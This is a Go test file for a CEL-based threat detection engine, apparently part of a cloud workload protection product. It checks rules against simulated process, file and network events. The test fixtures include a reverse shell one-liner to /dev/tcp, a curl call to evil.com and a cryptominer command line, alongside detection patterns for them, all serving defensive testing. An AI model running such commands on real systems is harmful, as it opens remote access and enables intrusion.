package celengine

import (
	"fmt"
	"testing"

	"go.uber.org/zap"

	"github.com/matrixplusio/mxcwpp/internal/server/model"
)

// TestBuildActivation 测试 buildActivation 构建 CEL 求值变量
func TestBuildActivation(t *testing.T) {
	fields := map[string]string{
		"exe":     "/usr/bin/curl",
		"cmdline": "curl http://evil.com",
		"pid":     "1234",
	}
	act := buildActivation(3000, fields)

	// data_type 应为 int64
	if dt, ok := act["data_type"].(int64); !ok || dt != 3000 {
		t.Errorf("data_type = %v, want 3000", act["data_type"])
	}

	// 提供的字段应正确映射
	if act["exe"] != "/usr/bin/curl" {
		t.Errorf("exe = %v, want /usr/bin/curl", act["exe"])
	}
	if act["cmdline"] != "curl http://evil.com" {
		t.Errorf("cmdline = %v, want curl http://evil.com", act["cmdline"])
	}

	// 未提供的字段应默认为空字符串
	if act["hostname"] != "" {
		t.Errorf("hostname = %v, want empty string", act["hostname"])
	}
	if act["remote_addr"] != "" {
		t.Errorf("remote_addr = %v, want empty string", act["remote_addr"])
	}
}

// TestCompileAndEval 测试 CEL 表达式编译和求值
func TestCompileAndEval(t *testing.T) {
	env, err := newCELEnv()
	if err != nil {
		t.Fatalf("newCELEnv 失败: %v", err)
	}

	e := &Engine{env: env}

	tests := []struct {
		name       string
		expression string
		dataType   int32
		fields     map[string]string
		wantMatch  bool
	}{
		{
			name:       "挖矿进程检测",
			expression: `exe.contains("xmrig") || cmdline.contains("stratum+tcp")`,
			dataType:   3000,
			fields: map[string]string{
				"exe":     "/tmp/xmrig",
				"cmdline": "/tmp/xmrig --pool stratum+tcp://pool.example.com:3333",
			},
			wantMatch: true,
		},
		{
			name:       "挖矿进程 - 不匹配",
			expression: `exe.contains("xmrig") || cmdline.contains("stratum+tcp")`,
			dataType:   3000,
			fields: map[string]string{
				"exe":     "/usr/bin/curl",
				"cmdline": "curl https://example.com",
			},
			wantMatch: false,
		},
		{
			name:       "反弹 shell 检测",
			expression: `cmdline.contains("/dev/tcp") || cmdline.contains("bash -i")`,
			dataType:   3000,
			fields: map[string]string{
				"exe":     "/bin/bash",
				"cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			},
			wantMatch: true,
		},
		{
			name:       "高危文件修改",
			expression: `file_path == "/etc/passwd" && file_action == "modified"`,
			dataType:   6001,
			fields: map[string]string{
				"file_path":   "/etc/passwd",
				"file_action": "modified",
			},
			wantMatch: true,
		},
		{
			name:       "data_type 条件",
			expression: `data_type == 3000 && exe != ""`,
			dataType:   3000,
			fields: map[string]string{
				"exe": "/bin/bash",
			},
			wantMatch: true,
		},
		{
			name:       "data_type 不匹配",
			expression: `data_type == 3000 && exe != ""`,
			dataType:   6001,
			fields: map[string]string{
				"exe": "/bin/bash",
			},
			wantMatch: false,
		},
		{
			name:       "威胁名称检测",
			expression: `threat_name.contains("Trojan")`,
			dataType:   7001,
			fields: map[string]string{
				"threat_name": "Win.Trojan.Agent-12345",
			},
			wantMatch: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			program, err := e.compile(tt.expression)
			if err != nil {
				t.Fatalf("编译表达式失败: %v", err)
			}

			activation := buildActivation(tt.dataType, tt.fields)
			out, _, err := program.Eval(activation)
			if err != nil {
				t.Fatalf("求值失败: %v", err)
			}

			got := out.Value() == true
			if got != tt.wantMatch {
				t.Errorf("匹配结果 = %v, want %v", got, tt.wantMatch)
			}
		})
	}
}

// TestCompileInvalidExpression 测试无效表达式编译失败
func TestCompileInvalidExpression(t *testing.T) {
	env, err := newCELEnv()
	if err != nil {
		t.Fatalf("newCELEnv 失败: %v", err)
	}

	e := &Engine{env: env}

	tests := []struct {
		name       string
		expression string
	}{
		{"语法错误", `exe ==`},
		{"返回类型不是 bool", `exe + "test"`},
		{"未定义变量", `unknown_var == "test"`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := e.compile(tt.expression)
			if err == nil {
				t.Error("期望编译失败，但成功了")
			}
		})
	}
}

// TestProcessTreeAncestorEval 测试进程树祖先链 CEL 求值
func TestProcessTreeAncestorEval(t *testing.T) {
	logger, _ := zap.NewDevelopment()

	// 创建内存引擎，包含使用 ancestor_exes 的规则
	rules := []model.DetectionRule{
		{
			ID:         1,
			Name:       "bash_spawned_from_nginx",
			Expression: `ancestor_exes.exists(e, e.contains("nginx")) && exe.contains("bash")`,
			Severity:   "high",
			Enabled:    true,
		},
		{
			ID:         2,
			Name:       "normal_bash",
			Expression: `exe.contains("bash") && ancestor_exes.size() == 0`,
			Severity:   "info",
			Enabled:    true,
		},
	}

	eng, err := NewInMemory(logger, rules)
	if err != nil {
		t.Fatalf("创建内存引擎失败: %v", err)
	}

	hostID := "host-001"

	// 模拟进程树：nginx(pid=100) → worker(pid=200) → bash(pid=300)
	eng.Evaluate(3000, map[string]string{
		"agent_id":   hostID,
		"event_type": "process_exec",
		"pid":        "100",
		"ppid":       "1",
		"exe":        "/usr/sbin/nginx",
	})
	eng.Evaluate(3000, map[string]string{
		"agent_id":   hostID,
		"event_type": "process_exec",
		"pid":        "200",
		"ppid":       "100",
		"exe":        "/usr/sbin/nginx",
	})

	// bash(pid=300) spawned from nginx worker — 应触发规则 1
	matched := eng.Evaluate(3000, map[string]string{
		"agent_id":   hostID,
		"event_type": "process_exec",
		"pid":        "300",
		"ppid":       "200",
		"exe":        "/bin/bash",
		"cmdline":    "bash -i",
	})

	var foundRule1 bool
	for _, m := range matched {
		if m.Name == "bash_spawned_from_nginx" {
			foundRule1 = true
		}
		if m.Name == "normal_bash" {
			t.Error("不应匹配 normal_bash 规则（有祖先链）")
		}
	}
	if !foundRule1 {
		t.Error("应匹配 bash_spawned_from_nginx 规则")
	}

	// 无祖先进程的 bash（pid=500, ppid=999 不存在）— 应触发规则 2
	matched2 := eng.Evaluate(3000, map[string]string{
		"agent_id":   hostID,
		"event_type": "process_exec",
		"pid":        "500",
		"ppid":       "999",
		"exe":        "/bin/bash",
	})

	var foundRule2 bool
	for _, m := range matched2 {
		if m.Name == "normal_bash" {
			foundRule2 = true
		}
	}
	if !foundRule2 {
		t.Error("应匹配 normal_bash 规则（无祖先链）")
	}
}

// TestIsPrivateIPFunction 测试 CEL 自定义函数 is_private_ip
func TestIsPrivateIPFunction(t *testing.T) {
	logger, _ := zap.NewDevelopment()

	rules := []model.DetectionRule{
		{
			ID:         1,
			Name:       "external_connection",
			Expression: `!is_private_ip(remote_addr) && remote_addr != ""`,
			Severity:   "medium",
			Enabled:    true,
		},
		{
			ID:         2,
			Name:       "internal_connection",
			Expression: `is_private_ip(remote_addr)`,
			Severity:   "info",
			Enabled:    true,
		},
	}

	eng, err := NewInMemory(logger, rules)
	if err != nil {
		t.Fatalf("创建引擎失败: %v", err)
	}

	tests := []struct {
		name     string
		addr     string
		wantRule string
	}{
		{"外网 IP", "8.8.8.8", "external_connection"},
		{"内网 10.x", "10.0.1.5", "internal_connection"},
		{"内网 192.168.x", "192.168.1.100", "internal_connection"},
		{"内网 172.16.x", "172.16.0.1", "internal_connection"},
		{"环回地址", "127.0.0.1", "internal_connection"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			matched := eng.Evaluate(3002, map[string]string{
				"agent_id":    "host-test",
				"remote_addr": tt.addr,
			})
			var found bool
			for _, m := range matched {
				if m.Name == tt.wantRule {
					found = true
				}
			}
			if !found {
				names := make([]string, len(matched))
				for i, m := range matched {
					names[i] = m.Name
				}
				t.Errorf("期望匹配 %s，实际匹配: %v", tt.wantRule, names)
			}
		})
	}
}

// TestTrackerCountRecentAndFirstSeen 测试滑动窗口计数和首次出现变量
func TestTrackerCountRecentAndFirstSeen(t *testing.T) {
	logger, _ := zap.NewDevelopment()

	rules := []model.DetectionRule{
		{
			ID:         1,
			Name:       "high_frequency_exe",
			Expression: `recent_exe_count > 3`,
			Severity:   "high",
			Enabled:    true,
		},
		{
			ID:         2,
			Name:       "first_seen_tmp_exe",
			Expression: `first_seen_exe && exe.startsWith("/tmp/")`,
			Severity:   "medium",
			Enabled:    true,
		},
	}

	eng, err := NewInMemory(logger, rules)
	if err != nil {
		t.Fatalf("创建引擎失败: %v", err)
	}

	hostID := "host-freq"

	// 第一次执行 /tmp/malware — 应触发 first_seen 规则
	matched := eng.Evaluate(3000, map[string]string{
		"agent_id":   hostID,
		"event_type": "process_exec",
		"pid":        "100",
		"ppid":       "1",
		"exe":        "/tmp/malware",
	})

	var foundFirstSeen bool
	for _, m := range matched {
		if m.Name == "first_seen_tmp_exe" {
			foundFirstSeen = true
		}
		if m.Name == "high_frequency_exe" {
			t.Error("第一次执行不应触发 high_frequency 规则")
		}
	}
	if !foundFirstSeen {
		t.Error("首次出现的 /tmp/ 进程应触发 first_seen_tmp_exe 规则")
	}

	// 第二次执行 — 不再是 first_seen
	matched2 := eng.Evaluate(3000, map[string]string{
		"agent_id":   hostID,
		"event_type": "process_exec",
		"pid":        "101",
		"ppid":       "1",
		"exe":        "/tmp/malware",
	})
	for _, m := range matched2 {
		if m.Name == "first_seen_tmp_exe" {
			t.Error("第二次执行不应触发 first_seen 规则")
		}
	}

	// 继续执行直到超过阈值 (第 3、4 次)
	for i := 102; i <= 103; i++ {
		eng.Evaluate(3000, map[string]string{
			"agent_id":   hostID,
			"event_type": "process_exec",
			"pid":        fmt.Sprintf("%d", i),
			"ppid":       "1",
			"exe":        "/tmp/malware",
		})
	}

	// 第 5 次 — recent_exe_count 应 > 3，触发 high_frequency 规则
	matched5 := eng.Evaluate(3000, map[string]string{
		"agent_id":   hostID,
		"event_type": "process_exec",
		"pid":        "104",
		"ppid":       "1",
		"exe":        "/tmp/malware",
	})

	var foundHighFreq bool
	for _, m := range matched5 {
		if m.Name == "high_frequency_exe" {
			foundHighFreq = true
		}
	}
	if !foundHighFreq {
		t.Error("第 5 次执行应触发 high_frequency_exe 规则 (count > 3)")
	}
}

// TestIsPrivateIPUtil 测试 isPrivateIP 工具函数
func TestIsPrivateIPUtil(t *testing.T) {
	tests := []struct {
		addr string
		want bool
	}{
		{"10.0.0.1", true},
		{"10.255.255.255", true},
		{"172.16.0.1", true},
		{"172.31.255.255", true},
		{"172.32.0.1", false},
		{"192.168.0.1", true},
		{"192.168.254.106", true},
		{"127.0.0.1", true},
		{"8.8.8.8", false},
		{"1.1.1.1", false},
		{"::1", true},
		{"fe80::1", true},
		{"2001:db8::1", false},
		{"invalid", false},
		{"", false},
	}
	for _, tt := range tests {
		t.Run(tt.addr, func(t *testing.T) {
			got := isPrivateIP(tt.addr)
			if got != tt.want {
				t.Errorf("isPrivateIP(%q) = %v, want %v", tt.addr, got, tt.want)
			}
		})
	}
}

// TestParallelEvaluate 测试并行求值与顺序求值结果一致性
func TestParallelEvaluate(t *testing.T) {
	logger, _ := zap.NewDevelopment()

	// 生成 30 条规则，超过 parallelThreshold
	var rules []model.DetectionRule
	for i := 1; i <= 30; i++ {
		rules = append(rules, model.DetectionRule{
			ID:         uint(i),
			Name:       fmt.Sprintf("rule_%d", i),
			Expression: fmt.Sprintf(`exe.contains("match%d")`, i),
			Severity:   "medium",
			Enabled:    true,
		})
	}
	// 加一条通配规则
	rules = append(rules, model.DetectionRule{
		ID:         100,
		Name:       "catch_all",
		Expression: `exe != ""`,
		Severity:   "low",
		Enabled:    true,
	})

	eng, err := NewInMemory(logger, rules)
	if err != nil {
		t.Fatalf("创建引擎失败: %v", err)
	}

	fields := map[string]string{
		"agent_id":   "host-parallel",
		"event_type": "process_exec",
		"pid":        "1",
		"ppid":       "0",
		"exe":        "/tmp/match5",
		"cmdline":    "/tmp/match5 --test",
	}

	// 顺序求值
	eng.SetWorkers(1)
	seqMatched := eng.Evaluate(3000, fields)

	// 并行求值
	eng.SetWorkers(4)
	parMatched := eng.Evaluate(3000, fields)

	// 结果数量应一致
	if len(seqMatched) != len(parMatched) {
		t.Errorf("并行结果数 %d != 顺序结果数 %d", len(parMatched), len(seqMatched))
	}

	// 转为 map 对比
	seqSet := make(map[string]bool, len(seqMatched))
	for _, m := range seqMatched {
		seqSet[m.Name] = true
	}
	for _, m := range parMatched {
		if !seqSet[m.Name] {
			t.Errorf("并行结果包含顺序结果中没有的规则: %s", m.Name)
		}
	}

	// 应匹配 rule_5 和 catch_all
	if !seqSet["rule_5"] {
		t.Error("应匹配 rule_5")
	}
	if !seqSet["catch_all"] {
		t.Error("应匹配 catch_all")
	}
}

// TestDetectionRuleMatchesDataType 测试 DataType 匹配逻辑
func TestDetectionRuleMatchesDataType(t *testing.T) {
	tests := []struct {
		name      string
		dataTypes model.StringArray
		dataType  int32
		want      bool
	}{
		{"空 DataTypes 匹配所有", nil, 3000, true},
		{"匹配", model.StringArray{"3000", "3001"}, 3000, true},
		{"不匹配", model.StringArray{"3000", "3001"}, 6001, false},
		{"单值匹配", model.StringArray{"7001"}, 7001, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := &model.DetectionRule{DataTypes: tt.dataTypes}
			got := rule.MatchesDataType(tt.dataType)
			if got != tt.want {
				t.Errorf("MatchesDataType(%d) = %v, want %v", tt.dataType, got, tt.want)
			}
		})
	}
}
